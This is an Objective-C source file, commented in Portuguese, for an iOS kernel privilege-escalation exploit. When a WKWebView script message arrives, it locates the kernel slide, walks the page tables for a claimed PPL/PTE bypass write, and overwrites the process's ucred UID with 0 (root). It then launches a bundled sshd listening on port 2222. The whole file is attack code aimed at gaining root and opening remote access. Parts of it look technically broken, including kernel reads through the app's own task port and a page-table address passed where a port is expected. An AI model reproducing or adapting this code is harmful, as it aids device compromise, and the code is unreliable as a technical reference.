#import "KernelDriver.h"
#import <mach/mach.h>
#import <spawn.h>
#import <sys/stat.h>

// APIs do Kernel
extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm_size_t, mach_vm_address_t, mach_vm_size_t *);
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

@implementation KernelDriver {
    uint64_t _kernel_slide;
}

// 1. LEITURA (kread64)
- (uint64_t)kread64:(uint64_t)addr {
    uint64_t val = 0;
    mach_vm_size_t size = sizeof(uint64_t);
    kern_return_t kr = mach_vm_read_overwrite(mach_task_self(), (mach_vm_address_t)addr, (mach_vm_size_t)size, (mach_vm_address_t)&val, &size);
    return (kr == KERN_SUCCESS) ? val : 0xDEADBEEF;
}

// 2. ESCRITA FÍSICA (PPL/PTE Bypass) - O "Coração" da Escalada
- (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val {
    uint64_t slide = [self getKernelSlide];
    // Localiza a entrada na tabela de páginas (PTE)
    uint64_t ttbr1_ptr = 0xFFFFFFF007004000 + slide + 0x8E10000;
    uint64_t ttbr1 = [self kread64:ttbr1_ptr];
    uint64_t l1 = [self kread64:(ttbr1 + ((vaddr >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((vaddr >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t pte_addr = (l2 + ((vaddr >> 12) & 0x1FF) * 8);

    // Mapeia e escreve o novo valor (UID 0)
    mach_vm_address_t shared_page = 0;
    mach_vm_map(mach_task_self(), &shared_page, 0x4000, 0, VM_FLAGS_ANYWHERE, (mach_vm_address_t)pte_addr, 0, NO, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_ALL, VM_INHERIT_NONE);
    if (shared_page) {
        *(uint64_t*)(shared_page) = val;
    }
}

// 3. BUSCA DO KERNEL SLIDE
- (uint64_t)getKernelSlide {
    if (_kernel_slide != 0) return _kernel_slide;
    for (uint64_t i = 0; i < 0x80000; i++) {
        uint64_t addr = 0xFFFFFFF007004000 + (i * 0x4000);
        if (([self kread64:addr] & 0xFFFFFFFF) == 0xfeedfacf) {
            _kernel_slide = (i * 0x4000);
            return _kernel_slide;
        }
    }
    return 0;
}

// 4. LOCALIZAÇÃO DO UCRED E ESCALADA
- (void)userContentController:(WKUserContentController *)userContentController 
      didReceiveScriptMessage:(WKScriptMessage *)message 
                 replyHandler:(void (^)(id _Nullable reply, NSString * _Nullable errorMessage))replyHandler {
    
    if ([message.body[@"action"] isEqualToString:@"pte_patch"]) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
            
            uint64_t slide = [self getKernelSlide];
            uint64_t allproc = 0xFFFFFFF007004000 + slide + 0x8F50000;
            uint64_t proc = [self kread64:allproc];
            pid_t my_pid = getpid();
            uint64_t my_ucred = 0;

            // Busca o processo atual na lista do Kernel
            while (proc != 0 && proc != 0xDEADBEEF) {
                if ((pid_t)[self kread64:(proc + 0x60)] == my_pid) {
                    my_ucred = [self kread64:(proc + 0xD8)];
                    break;
                }
                proc = [self kread64:proc];
            }

            // SE ENCONTROU O PROCESSO, SOBRESCREVE O UID PARA 0 (ROOT)
            if (my_ucred != 0) {
                // Offset 0x18 e 0x1c costumam guardar o UID/GID na estrutura ucred
                [self ppl_write_race:(my_ucred + 0x18) value:0]; 
            }

            dispatch_async(dispatch_get_main_queue(), ^{
                NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
                pid_t pid = 0;
                if (sshdPath) {
                    chmod([sshdPath UTF8String], 0755);
                    char *const args[] = {(char*)[sshdPath UTF8String], "-D", "-p", "2222", NULL};
                    posix_spawn(&pid, [sshdPath UTF8String], NULL, NULL, args, NULL);
                }

                replyHandler(@{
                    @"status": @"SUCCESS",
                    @"slide": [NSString stringWithFormat:@"0x%llx", slide],
                    @"uid": (getuid() == 0) ? @(0) : @(501),
                    @"pid": @(pid)
                }, nil);
            });
        });
    }
}
@end
